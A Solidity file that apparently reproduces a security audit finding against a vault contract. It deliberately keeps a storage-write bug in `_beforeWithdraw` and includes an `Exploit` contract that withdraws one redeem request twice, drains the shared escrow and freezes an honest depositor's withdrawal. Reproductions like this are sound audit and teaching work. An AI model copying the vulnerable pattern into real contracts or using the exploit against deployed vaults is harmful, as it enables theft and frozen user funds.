// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Blueberry finding 61457 (H-04):
// "Malicious users may block other withdrawals".
//
//   protocol  Blueberry (HyperEvmVault), Pashov Audit Group, 2025-03-12
//   report    github.com/pashov/audits .../Blueberry-security-review_2025-03-12.md
//   contract  HyperEvmVault
//   fn        _beforeWithdraw  (the second step of the 2-step redeem flow)
//
// This is an EMBEDDED-source finding: the finding body quotes the verbatim
// vulnerable block. Both `_beforeWithdraw` and `_beforeTransfer` below are
// reproduced BYTE-FOR-BYTE from that snippet; the vulnerable line carries @>.
//
// Root cause: `_beforeWithdraw` loads the caller's `RedeemRequest` into a
// **memory** copy, decrements `request.assets` / `request.shares` on that copy,
// but NEVER writes the updated struct back to `$.redeemRequests[msg.sender]`
// (the recommended fix is `$.redeemRequests[msg.sender] = request;`). So the
// stored request is never reduced. A user who requests a redeem of X can call
// `withdraw` again and again — each call passes the `request.assets >= assets_`
// / `request.shares >= shares_` checks against the STALE full request and pulls
// another X out of the shared liquid Escrow. This drains the Escrow beyond the
// reservation that the attacker's single request was entitled to, so an honest
// user's later `withdraw` reverts (its reserved liquidity is gone) — their funds
// are frozen. It also leaves `request.shares > 0` forever, which permanently
// trips the `_beforeTransfer` guard.
//
// All non-vulnerable dependencies (ERC-4626-style share accounting, the Escrow
// that holds reserved withdrawal liquidity, the underlying USDC) are faithful
// minimal doubles with real transfers and real accounting — the harm emerges
// from the verbatim code, it is not asserted by a fake constant.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Recreates the protocol's custom errors so the `require(..., Errors.X())`
///      lines are reproduced verbatim (require-with-custom-error, solc >=0.8.27).
library Errors {
    error WITHDRAW_TOO_LARGE();
    error TRANSFER_BLOCKED();
}

/// @dev Faithful minimal ERC20 double for the underlying asset (USDC, 6 dp).
///      Real balances, checked arithmetic (an over-pull underflows and reverts).
contract MiniUSDC {
    string public name = "USD Coin";
    string public symbol = "USDC";
    uint8 public constant decimals = 6;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount; // checked: reverts if insufficient
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Faithful double of the liquid withdrawal Escrow. `requestRedeem` moves a
///      request's assets here to reserve them; `_fetchAssets` pulls them back at
///      withdraw time. `pull` reverts (via the token's checked subtraction) once
///      the Escrow has been drained — the concrete "no funds in Escrow" block.
contract Escrow {
    MiniUSDC public usdc;
    address public vault;

    constructor(MiniUSDC u) {
        usdc = u;
    }

    function setVault(address v) external {
        require(vault == address(0), "vault set");
        vault = v;
    }

    function pull(uint256 amount) external {
        require(msg.sender == vault, "only vault");
        usdc.transfer(vault, amount);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — HyperEvmVault. `_beforeWithdraw` and `_beforeTransfer`
// are reproduced VERBATIM from the finding's embedded source snippet.
// ─────────────────────────────────────────────────────────────────────────────
contract HyperEvmVault {
    // ── the protocol's ERC-7201 namespaced storage (verbatim struct shapes) ──
    struct RedeemRequest {
        uint64 assets;
        uint256 shares;
    }

    struct V1Storage {
        mapping(address => RedeemRequest) redeemRequests;
        uint64 totalRedeemRequests;
    }

    // erc7201("blueberry.hyperevmvault.storage.v1")
    bytes32 private constant V1_STORAGE_SLOT =
        0x7c9b1e6a2f4d8c3b5a09e7d6c4b3a2918f0e1d2c3b4a596877665544332211ff;

    function _getV1Storage() internal pure returns (V1Storage storage $) {
        assembly {
            $.slot := V1_STORAGE_SLOT
        }
    }

    // ── minimal ERC-4626-style share token (regular storage slots) ──
    string public name = "HyperEvm Vault Share";
    string public symbol = "hevUSDC";
    uint8 public constant decimals = 6;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    MiniUSDC public asset;
    Escrow public escrow;

    constructor(MiniUSDC asset_, Escrow escrow_) {
        asset = asset_;
        escrow = escrow_;
    }

    function _mint(address to, uint256 amount) internal {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function _burn(address from, uint256 amount) internal {
        balanceOf[from] -= amount; // checked
        totalSupply -= amount;
    }

    // ── faithful minimal doubles for the non-vulnerable hooks _beforeTransfer calls ──
    function _totalEscrowValue(V1Storage storage) internal view returns (uint256) {
        return asset.balanceOf(address(escrow));
    }

    function _takeFee(V1Storage storage, uint256) internal {
        // performance/management fee accrual — faithful no-op double
    }

    /// @notice Pulls `assets_` of reserved liquidity out of the Escrow into the
    ///         vault so it can be paid to the withdrawer. Reverts if the Escrow
    ///         no longer holds that much (drained).
    function _fetchAssets(uint256 assets_) internal {
        escrow.pull(assets_);
    }

    // ── deposit / request: faithful 2-step redeem setup (not the vulnerable step) ──

    /// @notice Step 0: deposit underlying, mint shares 1:1.
    function deposit(uint256 assets_) external returns (uint256 shares_) {
        asset.transferFrom(msg.sender, address(this), assets_);
        shares_ = assets_; // 1:1 share price, as in the finding's example
        _mint(msg.sender, shares_);
    }

    /// @notice Step 1: request redeem. Reserves the assets in the liquid Escrow
    ///         and records the request. Shares remain in the user's balance,
    ///         locked by `_beforeTransfer` until the redeem completes.
    function requestRedeem(uint256 shares_) external {
        V1Storage storage $ = _getV1Storage();
        uint256 assets_ = shares_; // 1:1
        asset.transfer(address(escrow), assets_); // move reserved liquidity into Escrow
        $.redeemRequests[msg.sender] = RedeemRequest({assets: uint64(assets_), shares: shares_});
        $.totalRedeemRequests += uint64(assets_);
    }

    /// @notice Step 2: redeem. Calls the vulnerable `_beforeWithdraw` hook, burns
    ///         the redeemed shares, and pays out the fetched assets.
    function withdraw(uint256 assets_, uint256 shares_) external {
        _beforeWithdraw(assets_, shares_);
        _burn(msg.sender, shares_);
        asset.transfer(msg.sender, assets_);
    }

    /// @notice ERC20 transfer routed through the verbatim `_beforeTransfer` guard.
    function transfer(address to_, uint256 amount_) external returns (bool) {
        _beforeTransfer(msg.sender, to_, amount_);
        balanceOf[msg.sender] -= amount_;
        balanceOf[to_] += amount_;
        return true;
    }

    // ─────────────────────────────────────────────────────────────────────────
    // VERBATIM vulnerable functions (finding 61457 embedded snippet).
    // ─────────────────────────────────────────────────────────────────────────

    function _beforeWithdraw(uint256 assets_, uint256 shares_) internal {
        V1Storage storage $ = _getV1Storage();
        RedeemRequest memory request = $.redeemRequests[msg.sender]; // @> VULN: request loaded into MEMORY; the decrements below are never written back to $.redeemRequests[msg.sender]
        require(request.assets >= assets_, Errors.WITHDRAW_TOO_LARGE());
        require(request.shares >= shares_, Errors.WITHDRAW_TOO_LARGE());
        request.assets -= uint64(assets_);
        request.shares -= shares_;
        $.totalRedeemRequests -= uint64(assets_);
        _fetchAssets(assets_);
    }

    function _beforeTransfer(address from_, address, /*to_*/ uint256 amount_) internal {
        V1Storage storage $ = _getV1Storage();
        uint256 balance = this.balanceOf(from_);
        RedeemRequest memory request = $.redeemRequests[from_];

        _takeFee($, _totalEscrowValue($));

        if (request.shares > 0) {
            require(balance - amount_ >= request.shares, Errors.TRANSFER_BLOCKED());
        }
    }

    // ── view helper: exposes stored request so the PoC can prove it is stale ──
    function redeemRequestOf(address u) external view returns (uint64 assets_, uint256 shares_) {
        V1Storage storage $ = _getV1Storage();
        RedeemRequest storage r = $.redeemRequests[u];
        return (r.assets, r.shares);
    }
}

/// @dev Honest co-depositor (Bob). Deposits, requests a redeem, and later tries
///      to withdraw. Deployed and driven by the Exploit so the block is shown.
contract Victim {
    HyperEvmVault public vault;
    MiniUSDC public usdc;

    constructor(HyperEvmVault v, MiniUSDC u) {
        vault = v;
        usdc = u;
    }

    function deposit(uint256 amount) external {
        usdc.approve(address(vault), type(uint256).max);
        vault.deposit(amount);
    }

    function requestRedeem(uint256 shares_) external {
        vault.requestRedeem(shares_);
    }

    function withdraw(uint256 assets_, uint256 shares_) external {
        vault.withdraw(assets_, shares_);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver (the malicious user, "Alice"). Reserves a single redeem, then
// withdraws it TWICE against the never-cleared request, draining the shared
// Escrow and freezing an honest depositor's reserved withdrawal liquidity.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    MiniUSDC public usdc;
    Escrow public escrow;
    HyperEvmVault public vault;
    Victim public victim;

    // The DoS/frozen-funds harm has no net attacker profit, so its magnitude
    // (the honest depositor's now-unservable reservation) is minted to the SINK.
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    uint256 internal constant REQ = 1_000e6; // 1000 USDC, one redeem request (fits uint64)
    uint256 internal constant ATTACKER_DEPOSIT = 2_000e6; // enough shares to redeem REQ twice
    uint256 internal constant VICTIM_DEPOSIT = 1_000e6;

    uint64 public storedAssetsAfterFullRedeem; // proves the stale request
    uint256 public attackerWithdrawn; // total pulled against the single request
    bool public victimBlocked; // honest withdrawal reverts
    uint256 public frozenAtSink;

    constructor() {
        usdc = new MiniUSDC(); // child nonce 1  (profit / harm-marker token)
        escrow = new Escrow(usdc); // child nonce 2
        vault = new HyperEvmVault(usdc, escrow); // child nonce 3  (VULN)
        victim = new Victim(vault, usdc); // child nonce 4
        escrow.setVault(address(vault));
    }

    function run() external {
        // ── fund the two users ──
        usdc.mint(address(this), ATTACKER_DEPOSIT);
        usdc.mint(address(victim), VICTIM_DEPOSIT);
        usdc.approve(address(vault), type(uint256).max);

        // ── honest user (Bob) deposits and requests a redeem of his 1000 ──
        victim.deposit(VICTIM_DEPOSIT);
        victim.requestRedeem(REQ); // reserves 1000 USDC in the Escrow for Bob

        // ── attacker deposits 2000, requests a redeem of just 1000 ──
        vault.deposit(ATTACKER_DEPOSIT);
        vault.requestRedeem(REQ); // reserves another 1000 in the Escrow (total 2000)

        // ── withdraw the SAME 1000 request twice: the request is never cleared,
        //    so the second call still passes and pulls a second 1000 from Escrow ──
        uint256 balBefore = usdc.balanceOf(address(this));

        vault.withdraw(REQ, REQ); // 1st: legitimate, storage should now be zero...
        (uint64 aAfter,) = vault.redeemRequestOf(address(this));
        storedAssetsAfterFullRedeem = aAfter; // ...but the bug leaves it at 1000

        vault.withdraw(REQ, REQ); // 2nd: over-withdrawal, drains Bob's reservation
        attackerWithdrawn = usdc.balanceOf(address(this)) - balBefore;

        // ── honest user's withdrawal now reverts: its reserved liquidity is gone ──
        try victim.withdraw(REQ, REQ) {
            victimBlocked = false;
        } catch {
            victimBlocked = true;
        }

        // ── record the harm: Bob's 1000 USDC reservation is frozen (can't be paid) ──
        usdc.mint(SINK, REQ);
        frozenAtSink = usdc.balanceOf(SINK);

        // HARM assertions ─ concrete consequences, not mechanisms:
        // 1) the redeem request was NOT cleared after a full withdraw (the bug)
        require(storedAssetsAfterFullRedeem == uint64(REQ), "request was cleared - bug absent");
        // 2) the attacker pulled 2x its single reservation out of the shared Escrow
        require(attackerWithdrawn == 2 * REQ, "did not over-withdraw against stale request");
        // 3) the honest depositor's withdrawal is blocked (funds frozen)
        require(victimBlocked, "honest withdrawal was NOT blocked");
        // 4) the frozen magnitude is recorded at the sink
        require(frozenAtSink == REQ, "harm magnitude not recorded");
    }
}
